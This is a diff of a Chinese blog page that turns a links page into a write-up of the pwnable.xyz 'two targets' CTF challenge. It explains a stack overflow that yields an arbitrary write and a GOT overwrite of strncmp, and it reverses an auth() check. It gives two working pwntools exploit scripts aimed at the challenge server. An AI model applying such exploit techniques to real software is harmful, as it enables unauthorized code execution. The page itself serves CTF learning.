@@ -3,30 +3,40 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>friends - thatshaman&#39;s site</title>
+  <title>pwnable.xyz two targets WriteUp - thatshaman&#39;s site</title>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
 
   <link rel="shortcut icon" href="/home.png" type="image/png">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="friends">
-<meta property="og:url" content="http://shiroinu.top/PY.html">
+  <meta name="description" content="pwnable.xyz 上的two targets的WriteUp。">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.xyz two targets WriteUp">
+<meta property="og:url" content="http://shiroinu.top/2019/09/12/twotargets/index.html">
 <meta property="og:site_name" content="thatshaman&#39;s site">
+<meta property="og:description" content="pwnable.xyz 上的two targets的WriteUp。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://i2.tiimg.com/696456/dff885aca477af78.jpg">
-<meta property="og:updated_time" content="2019-08-07T14:57:49.285Z">
+<meta property="og:image" content="https://i.loli.net/2019/09/12/yN2GnJkgAhOiSVU.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/12/3oWZYFRrVfyHunv.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/12/MAsQIB13NypSlze.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/12/Dqhrd3jSLR4lgvb.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/12/l8hpWe6RCquALSj.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/12/Cbcpi2Y1nhokurI.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/12/mrv7etdOAulVYwk.png">
+<meta property="og:updated_time" content="2019-09-12T13:32:26.447Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="friends">
-<meta name="twitter:image" content="http://i2.tiimg.com/696456/dff885aca477af78.jpg">
+<meta name="twitter:title" content="pwnable.xyz two targets WriteUp">
+<meta name="twitter:description" content="pwnable.xyz 上的two targets的WriteUp。">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/12/yN2GnJkgAhOiSVU.png">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1568295485395">
+  <link rel="stylesheet" href="/css/style.css?v=1568295485465">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -151,58 +161,94 @@
               <i class="mdui-icon material-icons">menu</i>
             </a>
           </div>
-        <style>
-  article ul {
-    list-style-type: none;
-    padding: 0;
-    display: flex;
-    flex-direction: row;
-    flex-wrap: wrap;
-    margin: -5px;
-  }
-  article ul li {
-    transition: all .03s;
-    width: calc(12.5% - 10px);
-    margin: 5px;
-    border-radius: 4px;
-    border: 1px solid #eee;
-    font-size: 0;
-    overflow: hidden;
-  }
-  article ul li > a::after {
-    font-size: 13px;
-    color: #606266;
-    -webkit-transition: none;
-    transition: none;
-    content: attr(title);
-    display: block;
-    position: relative;
-    width: 100%;
-    border: none;
-    padding: 3px 10px 5px 10px;
-    margin-top: -2px;
-    text-align: center;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    white-space: nowrap;
-  }
-  article ul li img {
-    width: 100%;
-    border-radius: 0;
-    border: none;
-  }
-  @media screen and (max-width: 768px) {
-    article ul li {
-      width: calc(33.3333333333% - 10px);
-    }
-}
-</style>
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="/images/back1.png">
+        
+        <h1>pwnable.xyz two targets WriteUp</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月12日</a>
+    <a><i class="nexmoefont icon-areachart"></i>582 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 3 分钟</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
+    
+  </div>
+  <article>
+    <p>pwnable.xyz 上的two targets的WriteUp。</p>
+<a id="more"></a>
 
-<div class="nexmoe-post">
-  <article class="nexmoe-py">
-    <ul>
-<li><a href="https://wood1314.github.io/" title="木头的小木屋" target="_blank" rel="noopener"><img src="http://i2.tiimg.com/696456/dff885aca477af78.jpg" alt="木头的小木屋"></a></li>
-</ul>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/yN2GnJkgAhOiSVU.png" alt="MarkDown"></p>
+<p>顾名思义，two targets，本题有两种做法。</p>
+<h2 id="方法一-GOT覆写"><a href="#方法一-GOT覆写" class="headerlink" title="方法一 : GOT覆写"></a>方法一 : GOT覆写</h2><p><img src="https://i.loli.net/2019/09/12/3oWZYFRrVfyHunv.png" alt="MarkDown"></p>
+<p><img src="https://i.loli.net/2019/09/12/MAsQIB13NypSlze.png" alt="MarkDown"></p>
+<p>由于v7 v8之间距离为0x10 = 16 ，而scanf往<code>&amp;v7</code>中读入的有24字节，因此可以先选择输入2，覆写</p>
+<p><code>v8</code>中存储的地址，然后输入3，达到任意写的目的。又因为并没有开启FULL RELRO保护，所以可以GOT覆写。</p>
+<p><img src="https://i.loli.net/2019/09/12/Dqhrd3jSLR4lgvb.png" alt="MarkDown"></p>
+<p><em>注意</em> </p>
+<p>因为往v8中读入的scanf()是%d 因此win()函数的地址需要转化成10进制输入0x40099c = 4196764</p>
+<h3 id="方法一-EXP"><a href="#方法一-EXP" class="headerlink" title="方法一 EXP"></a>方法一 EXP</h3><pre><code class="python">#coding:utf-8
+from pwn import *
+context.log_level = &#39;DEBUG&#39;
+#sh = process(&#39;./challenge&#39;)
+sh = remote(&#39;svc.pwnable.xyz&#39;,30031)
+elf = ELF(&#39;./challenge&#39;)
+#puts_got = elf.got[&#39;puts&#39;]
+#got覆写，如果选择覆写puts()则会报错，原因不明
+strcmp_got = elf.got[&#39;strncmp&#39;]
+#print(puts_got)
+flag =     0x40099C
+payload = &#39;A&#39; * 16 + p64(strcmp_got)
+#sh.recvuntil(&#39;&gt; &#39;)
+sh.sendlineafter(&#39;&gt; &#39;,&#39;2&#39;)
+#sh.recvuntil(&#39;: &#39;)
+#gdb.attach(sh)
+sh.sendafter(&#39;: &#39;,payload)
+print(payload)
+#sh.recvuntil(&#39;&gt; &#39;)
+sh.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;)
+
+payload = &#39;4196764&#39;
+#sh.recvuntil(&#39;: &#39;)
+sh.sendlineafter(&#39;: &#39;,payload)
+#sh.recvuntil(&#39;&gt; &#39;)
+#gdb.attach(sh)
+sh.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)
+sh.interactive()</code></pre>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>方法二即按照题目思路，通过满足auth()函数的条件获得flag。</p>
+<p><img src="https://i.loli.net/2019/09/12/l8hpWe6RCquALSj.png" alt="MarkDown"></p>
+<p><code>s2</code>是全局变量 </p>
+<p><img src="https://i.loli.net/2019/09/12/Cbcpi2Y1nhokurI.png" alt="MarkDown"></p>
+<p>main() 即从<code>0x400B04</code> 到 <code>0x400B23</code>的内容</p>
+<p><img src="https://i.loli.net/2019/09/12/mrv7etdOAulVYwk.png" alt="MarkDown"></p>
+<p><em>注意</em></p>
+<p>看auth()的运算式时一定要仔细，我就因为括号顺序看错直接整个式子就错了。是左边<code>a1[i]</code>经过运算之后再和<code>main[i]</code>异或得到<code>s2[i]</code>的值。</p>
+<h3 id="方法二-EXP"><a href="#方法二-EXP" class="headerlink" title="方法二 EXP"></a>方法二 EXP</h3><pre><code class="python">#encoding:utf-8
+main = &#39;55 48 89 E5 48 83 EC 50 64 48 8B 04 25 28 00 00 00 48 89 45 F8 31 C0 E8 24 FE FF FF 48 8D 45 C0&#39;.split(&#39; &#39;)
+s2   = &#39;11 DE CF 10 DF 75 BB A5 43 1E 9D C2 E3 BF F5 D6 96 7F BE B0 BF B7 96 1D A8 BB 0A D9 BF C9 0D FF&#39;.split(&#39; &#39;)
+#print(main)
+#print(s2)
+result = []
+for i in range(32):
+    result.append( int(main[i],16) ^ int(s2[i],16) )
+ans = &#39;&#39;
+for i in range(32):
+    for j in range(256):
+        if(((j &gt;&gt; 4) | ( (16 * j) &amp; 0xff ) ) == result[i] ):
+            ans += chr(j)
+#特别注意： (16*j)需要 &amp; 0xff,因为16*j的结果很容易就&gt;256 之后结果一定不正确
+print(ans)
+from pwn import *
+context.log_level = &#39;DEBUG&#39;
+#sh = process(&#39;./challenge&#39;)
+sh = remote(&#39;svc.pwnable.xyz&#39;,30031)
+sh.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;)
+sh.sendlineafter(&#39;: &#39;,ans)
+sh.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)
+sh.interactive()</code></pre>
 
   </article>
   <section class="nexmoe-comment">
